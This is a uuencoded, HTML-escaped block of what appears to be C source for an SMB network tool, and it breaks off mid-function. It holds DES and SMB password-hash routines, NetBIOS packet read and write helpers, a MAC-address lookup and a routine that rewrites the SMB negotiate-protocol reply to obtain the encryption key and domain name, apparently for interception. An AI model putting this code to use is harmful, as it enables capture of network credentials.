M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@,S&lt;L(&quot;`U+&quot;`T-2P@,3,L(#4S+&quot;`R
M,2P@-C$L(#(Y+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@,S8L(&quot;`T+&quot;`T
M-&quot;P@,3(L(#4R+&quot;`R,&quot;P@-C`L(#(X+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@,S4L(&quot;`S+&quot;`T,RP@,3$L(#4Q+&quot;`Q.2P@-3DL(#(W+`T*(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@,S0L(&quot;`R+&quot;`T,BP@,3`L(#4P+&quot;`Q.&quot;P@-3@L(#(V
M+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@,S,L(&quot;`Q+&quot;`T,2P@(#DL(#0Y
M+&quot;`Q-RP@-3&lt;L(#(U?3L-&quot;@T*#0IS=&amp;%T:6,@=6-H87(@&lt;V-;,39=(#T@&gt;S$L
M(#$L(#(L(#(L(#(L(#(L(#(L(#(L(#$L(#(L(#(L(#(L(#(L(#(L(#(L(#%]
M.PT*#0IS=&amp;%T:6,@=6-H87(@&lt;V)O&gt;%LX75LT75LQ-ET@/2![#0I[&gt;S$T+&quot;`@
M-&quot;P@,3,L(&quot;`Q+&quot;`@,BP@,34L(#$Q+&quot;`@.&quot;P@(#,L(#$P+&quot;`@-BP@,3(L(&quot;`U
M+&quot;`@.2P@(#`L(&quot;`W?2P-&quot;B![,&quot;P@,34L(&quot;`W+&quot;`@-&quot;P@,30L(&quot;`R+&quot;`Q,RP@
M(#$L(#$P+&quot;`@-BP@,3(L(#$Q+&quot;`@.2P@(#4L(&quot;`S+&quot;`@.&#039;TL#0H@&gt;S0L(&quot;`Q
M+&quot;`Q-&quot;P@(#@L(#$S+&quot;`@-BP@(#(L(#$Q+&quot;`Q-2P@,3(L(&quot;`Y+&quot;`@-RP@(#,L
M(#$P+&quot;`@-2P@(#!]+`T*(&#039;LQ-2P@,3(L(&quot;`X+&quot;`@,BP@(#0L(&quot;`Y+&quot;`@,2P@
M(#&lt;L(&quot;`U+&quot;`Q,2P@(#,L(#$T+&quot;`Q,&quot;P@(#`L(&quot;`V+&quot;`Q,WU]+`T*#0I[&gt;S$U
M+&quot;`@,2P@(#@L(#$T+&quot;`@-BP@,3$L(&quot;`S+&quot;`@-&quot;P@(#DL(&quot;`W+&quot;`@,BP@,3,L
M(#$R+&quot;`@,&quot;P@(#4L(#$P?2P-&quot;B![,RP@,3,L(&quot;`T+&quot;`@-RP@,34L(&quot;`R+&quot;`@
M.&quot;P@,30L(#$R+&quot;`@,&quot;P@(#$L(#$P+&quot;`@-BP@(#DL(#$Q+&quot;`@-7TL#0H@&gt;S`L
M(#$T+&quot;`@-RP@,3$L(#$P+&quot;`@-&quot;P@,3,L(&quot;`Q+&quot;`@-2P@(#@L(#$R+&quot;`@-BP@
M(#DL(&quot;`S+&quot;`@,BP@,35]+`T*(&#039;LQ,RP@(#@L(#$P+&quot;`@,2P@(#,L(#$U+&quot;`@
M-&quot;P@(#(L(#$Q+&quot;`@-BP@(#&lt;L(#$R+&quot;`@,&quot;P@(#4L(#$T+&quot;`@.7U]+`T*#0I[
M&gt;S$P+&quot;`@,&quot;P@(#DL(#$T+&quot;`@-BP@(#,L(#$U+&quot;`@-2P@(#$L(#$S+&quot;`Q,BP@
M(#&lt;L(#$Q+&quot;`@-&quot;P@(#(L(&quot;`X?2P-&quot;B![,3,L(&quot;`W+&quot;`@,&quot;P@(#DL(&quot;`S+&quot;`@
M-&quot;P@(#8L(#$P+&quot;`@,BP@(#@L(&quot;`U+&quot;`Q-&quot;P@,3(L(#$Q+&quot;`Q-2P@(#%]+`T*
M(&#039;LQ,RP@(#8L(&quot;`T+&quot;`@.2P@(#@L(#$U+&quot;`@,RP@(#`L(#$Q+&quot;`@,2P@(#(L
M(#$R+&quot;`@-2P@,3`L(#$T+&quot;`@-WTL#0H@&gt;S$L(#$P+&quot;`Q,RP@(#`L(&quot;`V+&quot;`@
M.2P@(#@L(&quot;`W+&quot;`@-&quot;P@,34L(#$T+&quot;`@,RP@,3$L(&quot;`U+&quot;`@,BP@,3)]?2P-
M&quot;@T*&gt;WLW+&quot;`Q,RP@,30L(&quot;`S+&quot;`@,&quot;P@(#8L(&quot;`Y+&quot;`Q,&quot;P@(#$L(&quot;`R+&quot;`@
M.&quot;P@(#4L(#$Q+&quot;`Q,BP@(#0L(#$U?2P-&quot;B![,3,L(&quot;`X+&quot;`Q,2P@(#4L(&quot;`V
M+&quot;`Q-2P@(#`L(&quot;`S+&quot;`@-&quot;P@(#&lt;L(&quot;`R+&quot;`Q,BP@(#$L(#$P+&quot;`Q-&quot;P@(#E]
M+`T*(&#039;LQ,&quot;P@(#8L(&quot;`Y+&quot;`@,&quot;P@,3(L(#$Q+&quot;`@-RP@,3,L(#$U+&quot;`@,2P@
M(#,L(#$T+&quot;`@-2P@(#(L(&quot;`X+&quot;`@-&#039;TL#0H@&gt;S,L(#$U+&quot;`@,&quot;P@(#8L(#$P
M+&quot;`@,2P@,3,L(&quot;`X+&quot;`@.2P@(#0L(&quot;`U+&quot;`Q,2P@,3(L(&quot;`W+&quot;`@,BP@,31]
M?2P-&quot;@T*&gt;WLR+&quot;`Q,BP@(#0L(&quot;`Q+&quot;`@-RP@,3`L(#$Q+&quot;`@-BP@(#@L(&quot;`U
M+&quot;`@,RP@,34L(#$S+&quot;`@,&quot;P@,30L(&quot;`Y?2P-&quot;B![,30L(#$Q+&quot;`@,BP@,3(L
M(&quot;`T+&quot;`@-RP@,3,L(&quot;`Q+&quot;`@-2P@(#`L(#$U+&quot;`Q,&quot;P@(#,L(&quot;`Y+&quot;`@.&quot;P@
M(#9]+`T*(&#039;LT+&quot;`@,BP@(#$L(#$Q+&quot;`Q,&quot;P@,3,L(&quot;`W+&quot;`@.&quot;P@,34L(&quot;`Y
M+&quot;`Q,BP@(#4L(&quot;`V+&quot;`@,RP@(#`L(#$T?2P-&quot;B![,3$L(&quot;`X+&quot;`Q,BP@(#&lt;L
M(&quot;`Q+&quot;`Q-&quot;P@(#(L(#$S+&quot;`@-BP@,34L(&quot;`P+&quot;`@.2P@,3`L(&quot;`T+&quot;`@-2P@
M(#-]?2P-&quot;@T*&gt;WLQ,BP@(#$L(#$P+&quot;`Q-2P@(#DL(&quot;`R+&quot;`@-BP@(#@L(&quot;`P
M+&quot;`Q,RP@(#,L(&quot;`T+&quot;`Q-&quot;P@(#&lt;L(&quot;`U+&quot;`Q,7TL#0H@&gt;S$P+&quot;`Q-2P@(#0L
M(&quot;`R+&quot;`@-RP@,3(L(&quot;`Y+&quot;`@-2P@(#8L(&quot;`Q+&quot;`Q,RP@,30L(&quot;`P+&quot;`Q,2P@
M(#,L(&quot;`X?2P-&quot;B![.2P@,30L(#$U+&quot;`@-2P@(#(L(&quot;`X+&quot;`Q,BP@(#,L(&quot;`W
M+&quot;`@,&quot;P@(#0L(#$P+&quot;`@,2P@,3,L(#$Q+&quot;`@-GTL#0H@&gt;S0L(&quot;`S+&quot;`@,BP@
M,3(L(&quot;`Y+&quot;`@-2P@,34L(#$P+&quot;`Q,2P@,30L(&quot;`Q+&quot;`@-RP@(#8L(&quot;`P+&quot;`@
M.&quot;P@,3-]?2P-&quot;@T*&gt;WLT+&quot;`Q,2P@(#(L(#$T+&quot;`Q-2P@(#`L(&quot;`X+&quot;`Q,RP@
M(#,L(#$R+&quot;`@.2P@(#&lt;L(&quot;`U+&quot;`Q,&quot;P@(#8L(&quot;`Q?2P-&quot;B![,3,L(&quot;`P+&quot;`Q
M,2P@(#&lt;L(&quot;`T+&quot;`@.2P@(#$L(#$P+&quot;`Q-&quot;P@(#,L(&quot;`U+&quot;`Q,BP@(#(L(#$U
M+&quot;`@.&quot;P@(#9]+`T*(&#039;LQ+&quot;`@-&quot;P@,3$L(#$S+&quot;`Q,BP@(#,L(&quot;`W+&quot;`Q-&quot;P@
M,3`L(#$U+&quot;`@-BP@(#@L(&quot;`P+&quot;`@-2P@(#DL(&quot;`R?2P-&quot;B![-BP@,3$L(#$S
M+&quot;`@.&quot;P@(#$L(&quot;`T+&quot;`Q,&quot;P@(#&lt;L(&quot;`Y+&quot;`@-2P@(#`L(#$U+&quot;`Q-&quot;P@(#(L
M(&quot;`S+&quot;`Q,GU]+`T*#0I[&gt;S$S+&quot;`@,BP@(#@L(&quot;`T+&quot;`@-BP@,34L(#$Q+&quot;`@
M,2P@,3`L(&quot;`Y+&quot;`@,RP@,30L(&quot;`U+&quot;`@,&quot;P@,3(L(&quot;`W?2P-&quot;B![,2P@,34L
M(#$S+&quot;`@.&quot;P@,3`L(&quot;`S+&quot;`@-RP@(#0L(#$R+&quot;`@-2P@(#8L(#$Q+&quot;`@,&quot;P@
M,30L(&quot;`Y+&quot;`@,GTL#0H@&gt;S&lt;L(#$Q+&quot;`@-&quot;P@(#$L(&quot;`Y+&quot;`Q,BP@,30L(&quot;`R
M+&quot;`@,&quot;P@(#8L(#$P+&quot;`Q,RP@,34L(&quot;`S+&quot;`@-2P@(#A]+`T*(&#039;LR+&quot;`@,2P@
M,30L(&quot;`W+&quot;`@-&quot;P@,3`L(&quot;`X+&quot;`Q,RP@,34L(#$R+&quot;`@.2P@(#`L(&quot;`S+&quot;`@
M-2P@(#8L(#$Q?7U].PT*#0IS=&amp;%T:6,@=F]I9&quot;!P97)M=71E*&amp;-H87(@*F]U
M=&quot;P@8VAA&lt;B`J:6XL(&#039;5C:&amp;%R(&quot;IP+&quot;!I;G0@;BD-&quot;GL-&quot;@EI;G0@:3L-&quot;@EF
M;W(@*&amp;D],#MI/&amp;X[:2LK*0T*&quot;0EO=71;:5T@/2!I;EMP6VE=+3%=.PT*?0T*
M#0IS=&amp;%T:6,@=F]I9&quot;!L&lt;VAI9G0H8VAA&lt;B`J9&quot;P@:6YT(&amp;-O=6YT+&quot;!I;G0@
M;BD-&quot;GL-&quot;@EC:&amp;%R(&amp;]U=%LV-%T[#0H):6YT(&amp;D[#0H)9F]R(&quot;AI/3`[:3QN
M.VDK*RD-&quot;@D);W5T6VE=(#T@9%LH:2MC;W5N=&quot;DE;ET[#0H)9F]R(&quot;AI/3`[
M:3QN.VDK*RD-&quot;@D)9%MI72`](&amp;]U=%MI73L-&quot;GT-&quot;@T*&lt;W1A=&amp;EC(&#039;9O:60@
M8V]N8V%T*&amp;-H87(@*F]U=&quot;P@8VAA&lt;B`J:6XQ+&quot;!C:&amp;%R(&quot;II;C(L(&amp;EN=&quot;!L
M,2P@:6YT(&amp;PR*0T*&gt;PT*&quot;7=H:6QE(&quot;AL,2TM*0T*&quot;0DJ;W5T*RL@/2`J:6XQ
M*RL[#0H)=VAI;&amp;4@*&amp;PR+2TI#0H)&quot;2IO=70K*R`](&quot;II;C(K*SL-&quot;GT-&quot;@T*
M&lt;W1A=&amp;EC(&#039;9O:60@&gt;&amp;]R*&amp;-H87(@*F]U=&quot;P@8VAA&lt;B`J:6XQ+&quot;!C:&amp;%R(&quot;II
M;C(L(&amp;EN=&quot;!N*0T*&gt;PT*&quot;6EN=&quot;!I.PT*&quot;69O&lt;B`H:3TP.VD\;CMI*RLI#0H)
M&quot;6]U=%MI72`](&amp;EN,5MI72!&gt;(&amp;EN,EMI73L-&quot;GT-&quot;@T*&lt;W1A=&amp;EC(&#039;9O:60@
M9&amp;]H87-H*&amp;-H87(@*F]U=&quot;P@8VAA&lt;B`J:6XL(&amp;-H87(@*FME&gt;2P@:6YT(&amp;9O
M&lt;G&lt;I#0I[#0H):6YT(&amp;DL(&amp;HL(&amp;L[#0H)8VAA&lt;B!P:S%;-39=.PT*&quot;6-H87(@
M8ULR.%T[#0H)8VAA&lt;B!D6S(X73L-&quot;@EC:&amp;%R(&amp;-D6S4V73L-&quot;@EC:&amp;%R(&amp;MI
M6S$V75LT.%T[#0H)8VAA&lt;B!P9#%;-C1=.PT*&quot;6-H87(@;%LS,ETL(&#039;);,S)=
M.PT*&quot;6-H87(@&lt;FQ;-C1=.PT*#0H)&lt;&amp;5R;75T92AP:S$L(&amp;ME&gt;2P@&lt;&amp;5R;3$L
M(#4V*3L-&quot;@T*&quot;69O&lt;B`H:3TP.VD\,C@[:2LK*0T*&quot;0EC6VE=(#T@&lt;&amp;LQ6VE=
M.PT*&quot;69O&lt;B`H:3TP.VD\,C@[:2LK*0T*&quot;0ED6VE=(#T@&lt;&amp;LQ6VDK,CA=.PT*
M#0H)9F]R(&quot;AI/3`[:3PQ-CMI*RLI(&#039;L-&quot;@D);&#039;-H:69T*&amp;,L(&#039;-C6VE=+&quot;`R
M.&quot;D[#0H)&quot;6QS:&amp;EF=&quot;AD+&quot;!S8UMI72P@,C@I.PT*#0H)&quot;6-O;F-A=&quot;AC9&quot;P@
M8RP@9&quot;P@,C@L(#(X*3L@#0H)&quot;7!E&lt;FUU=&amp;4H:VE;:5TL(&amp;-D+&quot;!P97)M,BP@
M-#@I.R`-&quot;@E]#0H-&quot;@EP97)M=71E*&#039;!D,2P@:6XL(&#039;!E&lt;FTS+&quot;`V-&quot;D[#0H-
M&quot;@EF;W(@*&amp;H],#MJ/#,R.VHK*RD@&gt;PT*&quot;0EL6VI=(#T@&lt;&amp;0Q6VI=.PT*&quot;0ER
M6VI=(#T@&lt;&amp;0Q6VHK,S)=.PT*&quot;7T-&quot;@T*&quot;69O&lt;B`H:3TP.VD\,38[:2LK*2![
M#0H)&quot;6-H87(@97);-#A=.PT*&quot;0EC:&amp;%R(&amp;5R:ULT.%T[#0H)&quot;6-H87(@8ELX
M75LV73L-&quot;@D)8VAA&lt;B!C8ELS,ET[#0H)&quot;6-H87(@&lt;&amp;-B6S,R73L-&quot;@D)8VAA
M&lt;B!R,ELS,ET[#0H-&quot;@D)&lt;&amp;5R;75T92AE&lt;BP@&lt;BP@&lt;&amp;5R;30L(#0X*3L-&quot;@T*
M&quot;0EX;W(H97)K+&quot;!E&lt;BP@:VE;9F]R=R`_(&amp;D@.B`Q-2`M(&amp;E=+&quot;`T.&quot;D[#0H-
M&quot;@D)9F]R(&quot;AJ/3`[:CPX.VHK*RD-&quot;@D)&quot;69O&lt;B`H:STP.VL\-CMK*RLI#0H)
M&quot;0D)8EMJ75MK72`](&amp;5R:UMJ*C8@*R!K73L-&quot;@T*&quot;0EF;W(@*&amp;H],#MJ/#@[
M:BLK*2![#0H)&quot;0EI;G0@;2P@;CL-&quot;@D)&quot;6T@/2`H8EMJ75LP73P\,2D@?&quot;!B
M6VI=6S5=.PT*#0H)&quot;0EN(#T@*&amp;);:EU;,5T\/#,I(&#039;P@*&amp;);:EU;,ET\/#(I
M(&#039;P@#0H)&quot;0D)*&amp;);:EU;,UT\/#$I(&#039;P@8EMJ75LT73L@#0H-&quot;@D)&quot;69O&lt;B`H
M:STP.VL\-#MK*RLI(`T*&quot;0D)&quot;6);:EU;:UT@/2`H&lt;V)O&gt;%MJ75MM75MN72`F
M(`T*&quot;0D)&quot;0D)*#$\/&quot;@S+6LI*2D_,3HP.R`-&quot;@D)?0T*#0H)&quot;69O&lt;B`H:CTP
M.VH\.#MJ*RLI#0H)&quot;0EF;W(@*&amp;L],#MK/#0[:RLK*0T*&quot;0D)&quot;6-B6VHJ-&quot;MK
M72`](&amp;);:EU;:UT[#0H)&quot;7!E&lt;FUU=&amp;4H&lt;&amp;-B+&quot;!C8BP@&lt;&amp;5R;34L(#,R*3L-
M&quot;@T*&quot;0EX;W(H&lt;C(L(&amp;PL(&#039;!C8BP@,S(I.PT*#0H)&quot;69O&lt;B`H:CTP.VH\,S([
M:BLK*0T*&quot;0D);%MJ72`](&#039;);:ET[#0H-&quot;@D)9F]R(&quot;AJ/3`[:CPS,CMJ*RLI
M#0H)&quot;0ER6VI=(#T@&lt;C);:ET[#0H)?0T*#0H)8V]N8V%T*&#039;)L+&quot;!R+&quot;!L+&quot;`S
M,BP@,S(I.PT*#0H)&lt;&amp;5R;75T92AO=70L(&#039;)L+&quot;!P97)M-BP@-C0I.PT*?0T*
M#0IS=&amp;%T:6,@=F]I9&quot;!S=&#039;)?=&amp;]?:V5Y*&amp;-O;G-T(&#039;5N&lt;VEG;F5D(&amp;-H87(@
M*G-T&lt;BQU;G-I9VYE9&quot;!C:&amp;%R(&quot;IK97DI#0I[#0H):6YT(&amp;D[#0H-&quot;@EK97E;
M,%T@/2!S=&#039;);,%T^/C$[#0H):V5Y6S%=(#T@*&quot;AS=&#039;);,%TF,&#039;@P,2D\/#8I
M(&#039;P@*&#039;-T&lt;ELQ73X^,BD[#0H):V5Y6S)=(#T@*&quot;AS=&#039;);,5TF,&#039;@P,RD\/#4I
M(&#039;P@*&#039;-T&lt;ELR73X^,RD[#0H):V5Y6S-=(#T@*&quot;AS=&#039;);,ETF,&#039;@P-RD\/#0I
M(&#039;P@*&#039;-T&lt;ELS73X^-&quot;D[#0H):V5Y6S1=(#T@*&quot;AS=&#039;);,UTF,&#039;@P1BD\/#,I
M(&#039;P@*&#039;-T&lt;ELT73X^-2D[#0H):V5Y6S5=(#T@*&quot;AS=&#039;);-%TF,&#039;@Q1BD\/#(I
M(&#039;P@*&#039;-T&lt;ELU73X^-BD[#0H):V5Y6S9=(#T@*&quot;AS=&#039;);-5TF,&#039;@S1BD\/#$I
M(&#039;P@*&#039;-T&lt;ELV73X^-RD[#0H):V5Y6S==(#T@&lt;W1R6S9=)C!X-T8[#0H)9F]R
M(&quot;AI/3`[:3PX.VDK*RD@&gt;PT*&quot;0EK97E;:5T@/2`H:V5Y6VE=/#PQ*3L-&quot;@E]
M#0I]#0H-&quot;@T*&lt;W1A=&amp;EC(&#039;9O:60@&lt;VUB:&amp;%S:&quot;AU;G-I9VYE9&quot;!C:&amp;%R(&quot;IO
M=70L#0H)&quot;6-O;G-T(&#039;5N&lt;VEG;F5D(&amp;-H87(@*FEN+`T*&quot;0EC;VYS=&quot;!U;G-I
M9VYE9&quot;!C:&amp;%R(&quot;IK97DL#0H)&quot;6EN=&quot;!F;W)W*0T*&gt;PT*&quot;6EN=&quot;!I.PT*&quot;6-H
M87(@;W5T8ELV-%T[#0H)8VAA&lt;B!I;F);-C1=.PT*&quot;6-H87(@:V5Y8ELV-%T[
M#0H)=6YS:6=N960@8VAA&lt;B!K97DR6SA=.PT*#0H)&lt;W1R7W1O7VME&gt;2AK97DL
M(&amp;ME&gt;3(I.PT*#0H)9F]R(&quot;AI/3`[:3PV-#MI*RLI(&#039;L-&quot;@D):6YB6VE=(#T@
M*&amp;EN6VDO.%T@)B`H,3P\*#&lt;M*&amp;DE.&quot;DI*2D@/R`Q(#H@,#L-&quot;@D):V5Y8EMI
M72`](&quot;AK97DR6VDO.%T@)B`H,3P\*#&lt;M*&amp;DE.&quot;DI*2D@/R`Q(#H@,#L-&quot;@D)
M;W5T8EMI72`](#`[#0H)?0T*#0H)9&amp;]H87-H*&amp;]U=&amp;(L(&amp;EN8BP@:V5Y8BP@
M9F]R=RD[#0H-&quot;@EF;W(@*&amp;D],#MI/#@[:2LK*2![#0H)&quot;6]U=%MI72`](#`[
M#0H)?0T*#0H)9F]R(&quot;AI/3`[:3PV-#MI*RLI(&#039;L-&quot;@D):68@*&amp;]U=&amp;);:5TI
M#0H)&quot;0EO=71;:2\X72!\/2`H,3P\*#&lt;M*&amp;DE.&quot;DI*3L-&quot;@E]#0I]#0H-&quot;G9O
M:60@15]0,38H8V]N&lt;W0@=6YS:6=N960@8VAA&lt;B`J&lt;#$T+&#039;5N&lt;VEG;F5D(&amp;-H
M87(@*G`Q-BD-&quot;GL-&quot;G5N&lt;VEG;F5D(&amp;-H87(@&lt;W`X6SA=(#T@&gt;S!X-&amp;(L(#!X
M-#&lt;L(#!X-3,L(#!X,C$L(#!X-#`L(#!X,C,L(#!X,C0L(#!X,C5].PT*&quot;7-M
M8FAA&lt;V@H&lt;#$V+&quot;!S&lt;#@L(&#039;`Q-&quot;P@,2D[#0H)&lt;VUB:&amp;%S:&quot;AP,38K.&quot;P@&lt;W`X
M+&quot;!P,30K-RP@,2D[#0I]#0H-&quot;G9O:60@15]0,C0H8V]N&lt;W0@=6YS:6=N960@
M8VAA&lt;B`J&lt;#(Q+&quot;`-&quot;@D)8V]N&lt;W0@=6YS:6=N960@8VAA&lt;B`J8S@L(&#039;5N&lt;VEG
M;F5D(&amp;-H87(@*G`R-&quot;D-&quot;GL-&quot;@ES;6)H87-H*&#039;`R-&quot;P@8S@L(&#039;`R,2P@,2D[
M#0H)&lt;VUB:&amp;%S:&quot;AP,C0K.&quot;P@8S@L(&#039;`R,2LW+&quot;`Q*3L-&quot;@ES;6)H87-H*&#039;`R
M-&quot;LQ-BP@8S@L(&#039;`R,2LQ-&quot;P@,2D[#0I]#0H-&quot;B\J*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*B\-&quot;B\O36]D:69I960@9G5N8W1I;VYS(&#039;1O(&#039;)E860@86YD(&#039;=R
M:71E(`T*#0IV;VED(%)E860H#0H@(&quot;`@(&quot;`@(&quot;`@:6YT(%-O8VLL#0H@(&quot;`@
M(&quot;`@(&quot;`@=5]C:&amp;%R(&quot;I086-K970I#0I[#0H@3F)T4V5S&lt;VEO;DAD&lt;B!.8G13
M97-S:6]N.PT*#0H@;65M&lt;V5T*%!A8VME=&quot;PP+$E07TU!6%]325I%*3L-&quot;@D-
M&quot;B!R96%D*%-O8VLL)DYB=%-E&lt;W-I;VXL&lt;VEZ96]F*$YB=%-E&lt;W-I;VY(9&#039;(I
M*3L-&quot;B`@#0H@;65M8W!Y*%!A8VME=&quot;PH=5]C:&amp;%R(&quot;HI(&quot;@F3F)T4V5S&lt;VEO
M;BDL&lt;VEZ96]F*$YB=%-E&lt;W-I;VY(9&#039;(I*3L-&quot;@T*(&#039;)E860H4V]C:RP-&quot;B`@
M(&quot;`@(&quot;`H=5]C:&amp;%R(&quot;HI(&quot;A086-K970@*R!S:7IE;V8H3F)T4V5S&lt;VEO;DAD
M&lt;BDI+`T*(&quot;`@(&quot;`@(&amp;YT;VAS*$YB=%-E&lt;W-I;VXN3&amp;5N9W1H*2D[#0I]#0H@
M#0H-&quot;B`-&quot;G9O:60@5W)I=&amp;4H#0H@(&quot;`@(&quot;`@(&quot;`@(&amp;EN=&quot;!3;V-K+`T*(&quot;`@
M(&quot;`@(&quot;`@(&quot;!U7V-H87(@*E!A8VME=&quot;D-&quot;GL-&quot;B!.8G1397-S:6]N2&amp;1R(&quot;I.
M8G1397-S:6]N.PT*(`T*($YB=%-E&lt;W-I;VX@/2`H3F)T4V5S&lt;VEO;DAD&lt;B`J
M*2`H4&amp;%C:V5T*3L-&quot;B`-&quot;B!W&lt;FET92A3;V-K+`T*(&quot;`@(&quot;`@(%!A8VME=&quot;P-
M&quot;B`@(&quot;`@(&quot;!S:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BD@*R`-&quot;B`@(&quot;`@(&quot;!N=&amp;]H
M&lt;RA.8G1397-S:6]N+3Y,96YG=&amp;@I*3L-&quot;GT-&quot;@T*+RHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ+PT*#0HO*E1O(&amp;AA=F4@=&amp;AE($U!0R!A9&amp;1R97-S(&amp;]F(&#039;1H
M92!M86-H:6YE*B\-&quot;@T*=F]I9&quot;!&#039;971%;F5T061D&lt;F5S&lt;RAU7V-H87(@*D5N
M970L8VAA&lt;B`J1&amp;5V:6-E*0T*&gt;PT*(&amp;QI8FYE=%]T(&quot;IL.PT*(&#039;-T&lt;G5C=&quot;!L
M:6)N971?971H97)?861D&lt;B`J93L-&quot;B!C:&amp;%R($5R&lt;D)U9EM,24).151?15)2
M0E5&amp;7U-)6D5=.PT*#0H@;&quot;`](&amp;QI8FYE=%]I;FET*$Q)0DY%5%],24Y++$1E
M=FEC92Q%&lt;G)&quot;=68I.PT*#0H@92`](&amp;QI8FYE=%]G971?:&#039;=A9&amp;1R*&amp;PI.PT*
M#0H@;65M8W!Y*$5N970L92T^971H97)?861D&lt;E]O8W1E=&quot;Q%5$A?04Q%3BD[
M#0H-&quot;GT-&quot;@T*+RHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ+PT*#0HO*E1O(&amp;UO
M9&amp;EF&gt;2!T:&amp;4@;F5G&lt;&#039;)O=&quot;!R97!L&gt;2HO#0H-&quot;G9O:60@3F5G4&#039;)O=%)E&lt;&amp;QY
M*&#039;5?8VAA&lt;B`J4&amp;%C:V5T+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@=5]C:&amp;%R(&quot;I%
M;F-R&gt;7!T:6]N2V5Y+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@:6YT(&quot;I396-U&lt;FET
M&gt;2D-&quot;GL-&quot;B!.8G1397-S:6]N2&amp;1R(&quot;I.8G1397-S:6]N.PT*(`T*(%-M8D)A
M&lt;V5(9&#039;(@*E-M8D)A&lt;V4[#0H-&quot;B!3;6).96=0&lt;F]T4F5P;&#039;E(9&#039;(@*E-M8DYE
M9U!R;W1297!L&gt;3L-&quot;@T*+RI&amp;;W(@=&amp;AE(&amp;1O;6%I;B!N86UE*B\-&quot;@T*(&#039;5?
M8VAA&lt;B`J1&amp;]M86EN3F%M93L-&quot;@T*(&amp;EN=&quot;!$;VUA:6Y.86UE3&amp;5N9W1H.PT*
M#0HO*E-T87)T&lt;R!H97)E(&quot;$J+R`-&quot;B`-&quot;B!.8G1397-S:6]N(#T@*$YB=%-E
M&lt;W-I;VY(9&#039;(@*BD@*%!A8VME=&quot;D[#0H-&quot;B!3;6)&quot;87-E(#T@*%-M8D)A&lt;V5(
M9&#039;(@*BD@*%!A8VME=&quot;`K(&#039;-I&gt;F5O9BA.8G1397-S:6]N2&amp;1R*2D[#0H-&quot;B!3
M;6).96=0&lt;F]T4F5P;&#039;D@/2`H4VUB3F5G4&#039;)O=%)E&lt;&amp;QY2&amp;1R(&quot;HI(`T*(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;A086-K970@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;!S:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BD@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;!S:7IE;V8H4VUB0F%S94AD&lt;BDI.R`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(`T*(&quot;\J5&amp;\@:&amp;%V92!T:&amp;4@9&amp;]M86EN($YA;64J+PT*#0H@*E-E8W5R:71Y
M(#T@*%-M8DYE9U!R;W1297!L&gt;2T^4V5C=7)I=&#039;E-;V1E*2`F(#$[#0H-&quot;B!I
M9BA396-U&lt;FET&gt;2D-&quot;B![#0H@(&#039;!R:6YT9B@B7&amp;Y5&lt;V5R(&amp;QE=F5L(%-E8W5R
M:71Y7&amp;XB*3L-&quot;B!]#0H@96QS90T*(&#039;L-&quot;B`@&lt;&#039;)I;G1F*&quot;)&lt;;E-H87)E(&amp;QE
M=F5L(%-E8W5R:71Y7&amp;XB*3L-&quot;B!]#0H-&quot;B!$;VUA:6Y.86UE3&amp;5N9W1H(#T@
M(&quot;`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@4VUB3F5G4&#039;)O=%)E&lt;&amp;QY+3Y&quot;&gt;71E
M0V]U;G1;,%TM#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@($5.0U]+15E?3$5.1U1(
M.PT*#0H@1&amp;]M86EN3F%M92`](&quot;AU7V-H87(@*BD@#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;AM86QL;V,H1&amp;]M86EN3F%M94QE;F=T:&quot;`J(&#039;-I&gt;F5O9BAU7V-H87(I*2D[
M#0H-&quot;B`O*D-O&lt;&#039;D@=&amp;AE($1O;6%I;B!N86UE(&amp;EN(&amp;$@&lt;W1R:6YG*B\-&quot;@T*
M(&amp;UE;6-P&gt;2A$;VUA:6Y.86UE+`T*(&quot;`@(&quot;`@(&quot;`H=5]C:&amp;%R(&quot;HI(`T*(&quot;`@
M(&quot;`@(&quot;`H4&amp;%C:V5T(&quot;L-&quot;B`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA.8G1397-S:6]N2&amp;1R
M*2`K#0H@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H4VUB0F%S94AD&lt;BD@*PT*(&quot;`@(&quot;`@(&quot;`@
M&lt;VEZ96]F*%-M8DYE9U!R;W1297!L&gt;4AD&lt;BD@*PT*(&quot;`@(&quot;`@(&quot;`@14Y#7TM%
M65],14Y&#039;5$@I+`T*(&quot;`@(&quot;`@(&quot;!$;VUA:6Y.86UE3&amp;5N9W1H*3L-&quot;B`@(&quot;`@
